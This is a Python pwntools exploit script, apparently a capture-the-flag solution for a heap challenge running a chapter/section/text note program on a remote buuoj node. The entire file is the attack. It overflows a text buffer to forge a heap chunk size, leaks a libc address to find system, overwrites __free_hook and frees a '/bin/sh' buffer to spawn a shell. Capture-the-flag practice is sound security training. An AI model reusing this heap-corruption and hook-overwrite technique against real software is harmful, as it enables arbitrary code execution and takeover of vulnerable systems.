from pwn import *

#context.log_level = 'debug'

#p = process('./pwn1')
p = remote('node4.buuoj')

libc = ELF('libc-2.23.so')

ru = lambda s : p.recvuntil(s)
sn = lambda s : p.send(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)
sl = lambda s : p.sendline(s)
rv = lambda s : p.recv(s)

def debug(s):
	gdb.attach(p, '''
		source ~/libc/loadsym.py
		loadsym ~/libc/2.23/64/libc-2.23.debug.so
	''' + s)
	
def add_chapter(name):
	sla(b'choice:', b'1')
	sla(b'name:', name)

def add_section(chapter ,name):
	sla(b'choice:', b'2')
	sla(b'into:', chapter)
	sla(b'name:', name)

def add_text(section, size, content):
	sla(b'choice:', b'3')
	sla(b'into:', section)
	sla(b'write:', str(size).encode())
	sa(b'Text:', content)
	
def delete_chapter(chapter):
	sla(b'choice', b'4')
	sla(b'name:', chapter)

def delete_section(section):
	sla(b'choice', b'5')
	sla(b'name:', section)

def delete_text(section):
	sla(b'choice', b'6')
	sla(b'name', section)

def show():
	sla(b'choice', b'7')

def update(category, title, content):
	sla(b'choice', b'8')
	sla(b'update?(Chapter/Section/Text):', category.encode())
	sla(b'name:', title)
	if category == 'Chapter' or category == 'Section':
		sla(b'name:', content)
	else:
		sa(b'Text:', content)

sla(b'create: ', b'Yeuoly')
add_chapter(b'c1')
add_section(b'c1', b's11')
add_section(b'c1', b's12')
add_section(b'c1', b's13')
add_section(b'c1', b's14')
add_section(b'c1', b's15')

add_text(b's11', 0x60, b'222')
add_text(b's12', 0x60, b'222')
add_text(b's13', 0x60, b'222')
add_text(b's14', 0x60, b'222')

update('Text', b's11', b'a' * 0x60 +  p64(0) + p64(0xe1))
delete_text(b's12')

add_text(b's12', 0x60, b'222')
show()

ru(b's13')

libc_base = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x68 - libc.sym['__malloc_hook']
success('libc_base -> {}'.format(hex(libc_base)))

free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['__libc_system']

add_text(b's11', 0x60, b'222')
add_text(b's11', 0x60, b'222')
add_section(b'c1', b's15')

update('Text', b's11', b'/bin/sh\x00' + b'a' * 0x68 + b'a'.ljust(0x20,b'\0')+p64(free_hook))
update('Text', b'a', p64(system))

delete_text(b's11')

p.interactive()
